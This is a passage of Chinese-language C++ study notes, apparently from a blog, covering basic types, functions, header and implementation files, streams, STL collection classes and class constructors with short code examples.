id="constants">Constants</h3><p>常量的值一般不改变，例如 Π 的值，因此可以定义：</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">double</span> PI = <span class="number">3.14159265358979323846</span>;  <span class="comment">// 常量一般大写</span></span><br></pre></td></tr></tbody></table></figure><h3 id="基本数据类型">基本数据类型</h3><ol type="1"><li><p>整型</p><blockquote><p><strong>0</strong>42——八进制，<strong>0x</strong>51——十六进制</p><p>整型结尾有<code>U</code>表示无符号数</p></blockquote><ul><li>short</li><li>int</li><li>long：在数字结尾加上<code>L</code>则表示<code>long</code>类型</li></ul></li><li><p>浮点型</p><blockquote><p>用标准计数法表示光速：2.9979E+8</p></blockquote><ul><li>float</li><li>double</li><li>long double</li></ul></li><li><p>字符型</p><ul><li><p>char：单引号内只能是字符而不是字符串</p></li><li><p>string：使用双引号。需要通过<code>#include &lt;string&gt;</code>调用</p><blockquote><p>字符串类型是标准库命名空间的一部分，即命名空间也是<strong>std</strong></p></blockquote></li></ul></li><li><p>布尔型</p><ul><li>bool</li></ul></li><li><p>枚举型</p><ul><li><p>enum：语法为<code>enum typename { namelist };</code>（所有类型名称都以大写字母开头，枚举常量的名称完全以大写字母书写），示例如下：</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">enum</span> <span class="title class_">Direction</span> { NORTH, EAST, SOUTH, WEST };</span><br><span class="line"><span class="comment">//从0开始编号来为常量名称赋值。NORTH被赋予值0，EAST被赋予值1，SOUTH被赋予数值2，WEST被赋予数值3</span></span><br><span class="line"><span class="comment">//也支持用户自定义值的大小，例如：</span></span><br><span class="line"><span class="keyword">enum</span> <span class="title class_">Coin</span> { </span><br><span class="line">   PENNY = <span class="number">1</span>, </span><br><span class="line">   NICKEL = <span class="number">5</span>, </span><br><span class="line">   DIME = <span class="number">10</span>, </span><br><span class="line">   QUARTER = <span class="number">25</span>, </span><br><span class="line">   HALF_DOLLAR = <span class="number">50</span>, </span><br><span class="line">   DOLLAR = <span class="number">100</span> </span><br><span class="line">};</span><br><span class="line"><span class="comment">//若只为第一个常量赋值，则后续的常量是接着第一个常量连续编号的</span></span><br></pre></td></tr></tbody></table></figure></li></ul></li></ol><h3 id="运算符">运算符</h3><ul><li><p>单目运算符：一个操作数</p></li><li><p>双目运算符：两个操作数</p></li><li><p>三目运算符：</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(condition) ? exp1 : exp2  <span class="comment">//若condition为true，则返回exp1，否则返回exp2</span></span><br></pre></td></tr></tbody></table></figure></li></ul><h3 id="类型转换type-cast">类型转换（Type Cast）</h3><p>语法如下：</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">quotient = <span class="built_in">double</span>(num) / den; <span class="comment">//在对应变量 num 前添加转换后的类型</span></span><br></pre></td></tr></tbody></table></figure><h3 id="赋值">赋值</h3><p>下面这个式子的作用是<code>x=6, y=7, z=13</code></p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">z = (x = <span class="number">6</span>) + (y = <span class="number">7</span>)</span><br></pre></td></tr></tbody></table></figure><p>赋值表达式的返回值就是待赋的值</p><h3 id="控制语句">控制语句</h3><ul><li>if</li><li>switch</li><li>while：条件测试在循环的每个循环之前进行，包括第一个循环</li><li>for</li></ul><h2 id="chapter-2">Chapter 2</h2><h3 id="libraries-and-function">Libraries and Function</h3><p>当你编写C++程序时，计算机执行的大部分代码不是你自己编写的代码，而是你随应用程序加载的库代码。</p><ul><li>iostream</li><li>cmath：包含多个数学函数</li><li>string</li></ul><h3 id="overloading重载">Overloading（重载）</h3><p>不同函数（函数类型不同或参数不同）可以使用相同命名。例如，<code>&lt;cmath&gt;</code>库包含函数<code>abs</code>（求绝对值）的几个不同的版本，如下：</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">abs</span><span class="params">(<span class="type">int</span> x)</span> </span>{ </span><br><span class="line">   <span class="keyword">return</span> (x &lt; <span class="number">0</span>) ? -x : x; </span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">double</span> <span class="title">abs</span><span class="params">(<span class="type">double</span> x)</span> </span>{ </span><br><span class="line">   <span class="keyword">return</span> (x &lt; <span class="number">0</span>) ? -x : x; </span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="默认参数">默认参数</h3><p>在声明函数时，给参数设定好初始值，在调用时就可以省略该参数，如下：</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 声明</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">formatInColumns</span><span class="params">(<span class="type">int</span> nColumns = <span class="number">2</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用，此时nColumns的值自动设为2</span></span><br><span class="line">formatInColumns();</span><br></pre></td></tr></tbody></table></figure><p>注意：</p><ul><li>默认值的说明只出现在函数原型（声明）中，而不是在函数定义中。</li><li>任何默认参数都必须出现在参数列表的末尾。</li></ul><h3 id="引用参数">引用参数</h3><p>对于一般的参数，当你将一个简单变量从一个函数传递到另一个函数时，函数都会得到调用值的副本，该副本的修改影响不到原调用变量的值。例如下面的函数：</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">setToZero</span><span class="params">(<span class="type">int</span> var)</span> </span>{ </span><br><span class="line">   var = <span class="number">0</span>; </span><br><span class="line">}</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>{</span><br><span class="line">    <span class="type">int</span> x = <span class="number">2</span>;</span><br><span class="line">    <span class="built_in">setToZero</span>(x);   <span class="comment">// 不修改x的值</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>若要修改调用的变量的值，需要将一般的参数更改为引用参数，如下：</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">setToZero</span><span class="params">(<span class="type">int</span> &amp; var)</span> </span>{ </span><br><span class="line">   var = <span class="number">0</span>; </span><br><span class="line">}</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>{</span><br><span class="line">    <span class="type">int</span> x = <span class="number">2</span>;</span><br><span class="line">    <span class="built_in">setToZero</span>(x);   <span class="comment">// 修改x的值</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="接口与实现">接口与实现</h3><ul><li><strong>接口（Interface）</strong>：接口定义了库的使用方法和约定，它告诉使用者如何与库进行交互。接口包含了库向外部暴露的<strong>函数声明</strong>、<strong>类型定义</strong>和<strong>常量</strong>等内容。这些接口不会包含具体的实现细节，而是只描述了如何调用库中的功能。这些接口通常存放在<strong>头文件（headerfiles，.h）</strong>中。接口可以定义函数、常量、类以及枚举，其中枚举无需通过CPP进行实现，直接就可以调用</li><li><strong>实现（Implementation）</strong>：实现部分则包含了函数的实际代码、类的具体实现等细节。实现隐藏在库内部，用户无需关心这些细节。实现通常放在<strong>源文件（.cpp）</strong>中，并且编译后生成库文件（静态库或动态库）</li></ul><p>下面是 error 库的接口</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* File: error.h</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">//检查是否定义了_error_h符号。若 _error_h 符号将已经定义，编译器这次将跳过接口的内容。</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> _error_h</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _error_h</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">error</span><span class="params">(std::string msg)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></tbody></table></figure><p>实现（Implementation）如下：</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">"error.h"</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">error</span><span class="params">(string msg)</span> </span>{</span><br><span class="line">    cerr &lt;&lt; msg &lt;&lt; endl;</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><blockquote><p>在 .h 文件中声明常量或者变量需要使用 <strong>extern</strong>关键字</p><p>https://www.runoob.com/w3cnote/extern-head-h-different.html</p></blockquote><h3 id="随机数">随机数</h3><p>计算机内部算法过程生成的“随机”数被称为伪随机数。</p><ul><li><p><code>rand()</code>函数（头文件<code>#include&lt;cstdlib&gt;</code>）根据上一次产生的伪随机数（旧随机数）来生成新的伪随机数，范围是[0, RAND_MAX]</p></li><li><p><code>srand(int seed)</code>函数设置随机数种子s<sub>0</sub>，然后<code>rand</code>根据该种子生成第一个随机数。相同种子产生的随机数序列是相同的（方便调试）。</p><p>若不手动设置种子，则默认为1。一般将其设置为一些用户难以预测的起始值，这些起始值通常取自系统时钟的值，因为每次运行程序时，这个值都是不同的，所以随机数序列也会发生变化。具体实现方法是通过调用函数time 并将结果转换为整数来检索系统时钟的当前值。</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">srand</span>(<span class="built_in">int</span>(<span class="built_in">time</span>(<span class="literal">NULL</span>)));</span><br></pre></td></tr></tbody></table></figure></li></ul><figure><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20240912102359091.png" alt="image-20240912102359091"><figcaption aria-hidden="true">image-20240912102359091</figcaption></figure><h3 id="static">static</h3><ol type="1"><li>静态局部变量<ul><li>静态局部变量在函数第一次调用时初始化。</li><li>变量在后续的函数调用中会保留它之前的值，不会被重新初始化。</li><li>它的作用域依然只限于函数内部，但生命周期持续到程序结束</li></ul></li><li>静态全局变量<ul><li>在全局作用域中，如果变量用<code>static</code>修饰，变量的可见性（链接性）被限制在当前文件中。这种用法称为<strong>内部链接</strong>（internallinkage）。即该变量无法被其他文件使用，即使它是全局的。</li></ul></li><li>静态函数<ul><li>只能在定义的源文件中使用，不能被其他文件访问</li></ul></li><li>类的静态成员变量<ul><li>静态成员变量的存储空间是全局的，在程序启动时就分配。</li><li>它不属于任何特定的类实例（对象），所以可以通过类名直接访问。</li><li>静态成员变量必须在类定义外进行初始化。</li></ul></li><li>类的静态成员函数<ul><li>静态成员函数只能访问静态成员变量。</li><li>不需要通过类的对象来调用，可以直接通过类名调用。</li></ul></li></ol><h2 id="chapter-3">Chapter 3</h2><h3 id="string">string</h3><p>访问字符串内部的字符有两种方法：</p><ul><li><code>str[index]</code></li><li><code>str.at(index)</code></li></ul><p><code>string</code>类型可以通过<code>=</code>直接赋值，例如<code>str1=str2</code>，用<code>str2</code>中包含的字符串副本覆盖<code>str1</code>的先前内容，赋值过后再修改<code>str2</code>无法影响到<code>str1</code></p><p><code>string</code>类型包含截断函数<code>substr</code>，例如<code>str.substr(2, 3)</code>，意思是从索引2开始截取三个字符，若省略3，则从2截取到字符串结尾。</p><p><code>find</code>函数可以查找子字符串或字符，例如<code>str.find("o")</code></p><h3 id="cctype">&lt;cctype&gt;</h3><p>用于处理字符的库</p><h2 id="chapter-4">Chapter 4</h2><h3 id="streams">Streams</h3><p><code>&lt;iostream&gt;</code>中的三个标准流：<code>cin</code>、<code>cout</code>、<code>cerr</code></p><h3 id="manipulator操纵器">manipulator（操纵器）</h3><p>操纵器通常具有以改变后续输出格式的方式设置输出流属性的效果。</p><p>例如：<code>&lt;iostream&gt;</code>库中的<code>endl</code>，<code>&lt;iomanip&gt;</code>库中的<code>setw(n)</code>（设置输出宽度）、<code>setprecision(digits)</code>、<code>setfill(ch)</code></p><h3 id="file-streamsfstream">File streams（&lt;fstream&gt;）</h3><p>在C++中读取或写入文件需要以下步骤：</p><ol type="1"><li><p>声明一个流变量来引用文件。处理文件的程序通常为同时处于活动状态的每个文件声明一个流变量。因此，如果你正在编写一个读取输入文件并使用该数据写入输出文件的程序，你需要声明两个变量，如下所示</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fstream&gt;</span></span></span><br><span class="line"></span><br><span class="line">ifstream infile;  <span class="comment">// 用于读取文件数据</span></span><br><span class="line">ofstream outfile;  <span class="comment">//向文件写入数据</span></span><br></pre></td></tr></tbody></table></figure></li><li><p>打开文件，在使用流变量之前，您需要在该变量和实际文件之间建立关联。此操作称为打开文件，通过调用流方法open来执行。例如：</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">infile.<span class="built_in">open</span>(<span class="string">"Jabberwocky.txt"</span>); </span><br></pre></td></tr></tbody></table></figure><p>或者：</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">string filename = <span class="string">"Jabberwocky.txt"</span>;</span><br><span class="line">infile.<span class="built_in">open</span>(filename.<span class="built_in">c_str</span>());  <span class="comment">// open方法需要一个C样式的字符串作为文件名</span></span><br></pre></td></tr></tbody></table></figure></li><li><p>传输数据</p><p>打开数据文件之后，就可以使用适当的流操作来执行实际的 I/O操作。可以逐字符传输，也可以逐行传输。</p></li><li><p>关闭文件</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">infile.<span class="built_in">close</span>();</span><br></pre></td></tr></tbody></table></figure></li></ol><h3 id="单个字符-io">单个字符 I/O</h3><h4 id="输入流">输入流</h4><p>使用<code>get()</code>方法获取单个字符，如下：</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> ch; </span><br><span class="line">infile.<span class="built_in">get</span>(ch);</span><br></pre></td></tr></tbody></table></figure><p>连续读取字符：</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* get将下一个字符读入变量ch并返回流。如果get操作成功，则该流被解释为true，如果失败，则被解释为false</span></span><br><span class="line"><span class="comment">* 实际上 get 的返回值是 int 类型</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">char</span> ch; </span><br><span class="line"><span class="keyword">while</span> (infile.<span class="built_in">get</span>(ch)) { </span><br><span class="line">   Perform some operation on the character. </span><br><span class="line">}</span><br><span class="line"><span class="comment">// 下面是另一种写法</span></span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>) { </span><br><span class="line">   <span class="type">int</span> ch = infile.<span class="built_in">get</span>(); </span><br><span class="line">   <span class="keyword">if</span> (ch == EOF) <span class="keyword">break</span>;   <span class="comment">// end-of-file</span></span><br><span class="line">   Perform some operation on the character. </span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h4 id="输出流">输出流</h4><p>使用<code>put</code>函数，该函数采用char值作为参数，并将该字符写入流中，如下所示：</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">outfile.<span class="built_in">put</span>(ch);</span><br></pre></td></tr></tbody></table></figure><h3 id="string-streamssstream">String streams（&lt;sstream&gt;）</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">istringstream  //字符串输入流 类，可用于字符串转整型</span><br><span class="line">ostringstream  //字符串输出流 类，可用于整型转字符串</span><br></pre></td></tr></tbody></table></figure><h2 id="chapter-5">Chapter 5</h2><p>集合类（抽象数据类型）：Vector，Stack，Queue，Map，Set</p><h3 id="vector">Vector</h3><ol type="1"><li>头文件 <code>#include &lt;vector&gt;</code></li><li>定义一个整型vector：<code>vector&lt;int&gt; vec;</code>（该vector为空）</li><li>向结尾添加新元素：<code>vec.push_back(10);</code></li><li>向vector中间插入元素：<code>vec.insert(index, num);</code></li><li>删除元素：<code>vec.erase(index);</code></li><li>访问元素：类似于数组，通过下标访问例如<code>vec[2]</code>，或者通过<code>vec.at(2)</code>访问</li><li>获取vector大小：<code>vec.size()</code></li><li>二维数组：<code>vector&lt; vector&lt;int&gt; &gt; a;</code>或者指定二维数组的行和列大小<code>vector&lt; vector&lt;int&gt; &gt; a(r, vector&lt;int&gt;(c));</code>（r为行数，c为列数）</li></ol><h3 id="stack">Stack</h3><p>先进后出</p><ul><li>头文件：<code>#include &lt;stack&gt;</code></li><li><code>push()</code>: 在栈顶添加一个元素。</li><li><code>pop()</code>: 移除栈顶元素。</li><li><code>top()</code>: 返回栈顶元素的引用，但不移除它。</li><li><code>empty()</code>: 检查栈是否为空。</li><li><code>size()</code>: 返回栈中元素的数量</li></ul><h3 id="queue">Queue</h3><p>先进先出</p><ul><li>头文件：<code>#include &lt;queue&gt;</code></li><li><code>empty()</code>: 检查队列是否为空。</li><li><code>size()</code>: 返回队列中的元素数量。</li><li><code>front()</code>: 返回队首元素的引用。</li><li><code>back()</code>: 返回队尾元素的引用。</li><li><code>push()</code>: 在队尾添加一个元素。</li><li><code>pop()</code>: 移除队首元素。</li></ul><h3 id="map">Map</h3><p>概念上类似于字典。一个<code>key</code>对应一个<code>value</code>（键值对）</p><ul><li><p>头文件：<code>#include &lt;map&gt;</code></p></li><li><p>声明map：<code>map&lt;key_type, value_type&gt; myMap;</code></p></li><li><p>Stanford的<code>map.h</code>库使用<code>put(key, value)</code>将<code>key</code>与<code>value</code>进行关联，使用<code>get(key)</code>获取<code>value</code></p><p>或者直接<code>myMap[key] = value;</code></p></li><li><p><code>find(key)</code>返回指向该元素的迭代器，示例：https://www.cainiaojc.com/cpp/cpp-map-find-function.html</p></li></ul><h3 id="set">Set</h3><p>set中的每个元素都是唯一的</p><ul><li>头文件：<code>#include &lt;set&gt;</code></li></ul><blockquote><p>集合类的for循环简化：Range-basedfor（只读，不能修改variable；若要修改可通过引用实现）</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">for (type variable : collection) { </span><br><span class="line">   body of the loop </span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></blockquote><h2 id="chapter-6">Chapter 6</h2><p>类</p><h3 id="结构体">结构体</h3><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">Point</span> {</span><br><span class="line">    <span class="type">int</span> x;</span><br><span class="line">    <span class="type">int</span> y;</span><br><span class="line">};</span><br><span class="line">Point p;</span><br></pre></td></tr></tbody></table></figure><p>C++中可直接用结构体名称声明变量（<strong>C语言中必须使用</strong><code>struct Point p;</code>进行声明）</p><blockquote><p><strong>1. 使用 <code>struct</code>关键字来定义和引用结构体类型</strong></p><p>C 语言的结构体类型必须使用 <code>struct</code> 关键字，直接使用<code>struct</code> 名称进行命名和访问。</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Point</span> {</span></span><br><span class="line">    <span class="type">int</span> x;</span><br><span class="line">    <span class="type">int</span> y;</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用时必须加上 `struct` 关键字</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Point</span> <span class="title">p</span>;</span></span><br></pre></td></tr></tbody></table></figure><p><strong>2. 使用 <code>typedef</code> 为结构体创建别名</strong></p><p>如果你不想每次使用结构体时都加上 <code>struct</code> 关键字，可以用<code>typedef</code> 为结构体创建一个简化的别名。</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> {</span></span><br><span class="line">    <span class="type">int</span> x;</span><br><span class="line">    <span class="type">int</span> y;</span><br><span class="line">} Point;  <span class="comment">// 给结构体类型起别名为 Point</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用时不需要 `struct` 关键字</span></span><br><span class="line">Point p;</span><br></pre></td></tr></tbody></table></figure></blockquote><h3 id="类">类</h3><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Point</span> {</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">    <span class="type">int</span> x;</span><br><span class="line">    <span class="type">int</span> y;</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><ul><li><p>类与结构体的区别在于类中的字段可分为<code>public</code>和<code>private</code>两个部分</p></li><li><p>在现代面向对象编程中，不鼓励声明公共实例变量。常见的做法是将所有实例变量设置为私有，这意味着客户端无法直接访问内部变量。而是通过类中的函数来访问私有变量。</p></li></ul><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Point</span> {</span><br><span class="line">    <span class="keyword">private</span>:</span><br><span class="line">    <span class="type">int</span> x;</span><br><span class="line">    <span class="type">int</span> y;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">getX</span><span class="params">()</span> </span>{  <span class="comment">// 通过公有函数访问私有变量</span></span><br><span class="line">            <span class="keyword">return</span> x;</span><br><span class="line">        }</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">getY</span><span class="params">()</span> </span>{</span><br><span class="line">            <span class="keyword">return</span> y;</span><br><span class="line">        }</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><h4 id="构造函数constructor">构造函数（Constructor）</h4><ul><li>构造函数始终与类同名，大多数类一般会有一个不带参数的默认构造函数。</li><li>类通常定义多个版本的构造函数，以考虑不同的初始化模式</li><li>构造函数可以进行重载</li></ul><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Point</span> {</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Point</span>() {  <span class="comment">// 默认构造函数</span></span><br><span class="line">            x = <span class="number">0</span>;</span><br><span class="line">            y = <span class="number">0</span>;</span><br><span class="line">        }</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">Point</span>(<span class="type">int</span> xc, <span class="type">int</span> yc) {  <span class="comment">// 含参数的构造函数</span></span><br><span class="line">            x = xc;</span><br><span class="line">            y = yc;</span><br><span class="line">        }</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><ol type="1"><li><strong>构造函数体内赋值：</strong></li></ol><ul><li>先调用成员变量的默认构造函数，然后在构造函数体内对它们进行赋值操作。</li><li>对于基础类型没有明显区别，但对于类成员（如对象、容器等），会多一次默认构造和赋值操作。</li></ul><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span> {</span><br><span class="line">    <span class="type">int</span> a;</span><br><span class="line">    <span class="type">int</span> b;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">MyClass</span>(<span class="type">int</span> x, <span class="type">int</span> y) {</span><br><span class="line">        a = x;  <span class="comment">// 先默认构造，再赋值</span></span><br><span class="line">        b = y;</span><br><span class="line">    }</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><ol start="2" type="1"><li><strong>初始化列表：</strong></li></ol><ul><li>在构造对象时直接调用带参数的构造函数进行<strong>初始化</strong>，<strong>避免了不必要的赋值操作</strong>。</li><li>对于需要初始化的成员变量（如<code>const</code>成员、引用成员，或者没有默认构造函数的对象），必须使用初始化列表。</li></ul><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span> {</span><br><span class="line">    <span class="type">int</span> a;</span><br><span class="line">    <span class="type">int</span> b;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">MyClass</span>(<span class="type">int</span> x, <span class="type">int</span> y) : <span class="built_in">a</span>(x), <span class="built_in">b</span>(y) {  <span class="comment">// 初始化列表直接初始化</span></span><br><span class="line">        <span class="comment">// 构造函数体</span></span><br><span class="line">    }</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><h4 id="拷贝构造函数">拷贝构造函数</h4><blockquote><ol type="1"><li><p>如果你没有定义自己的拷贝构造函数，C++会为类生成一个<strong>默认</strong>的拷贝构造函数。这个默认拷贝构造函数只是简单地逐成员地复制对象的每个成员变量，称为<strong>浅拷贝</strong>。</p><p>浅拷贝在复制对象时，只会复制指针的地址而不会复制其指向的数据，可能会导致多个对象指向同一块内存区域，这会引发<strong>双重释放</strong> 或 <strong>悬空指针</strong> 等问题。</p></li><li><p>如果类中有需要特殊管理的资源（例如动态分配的内存、文件句柄等），你通常需要编写自定义的拷贝构造函数来实现<strong>深拷贝</strong>，即复制这些资源，而不仅仅是复制指针。</p></li></ol></blockquote><p>默认拷贝构造函数：</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ClassName</span>(<span class="type">const</span> ClassName&amp; 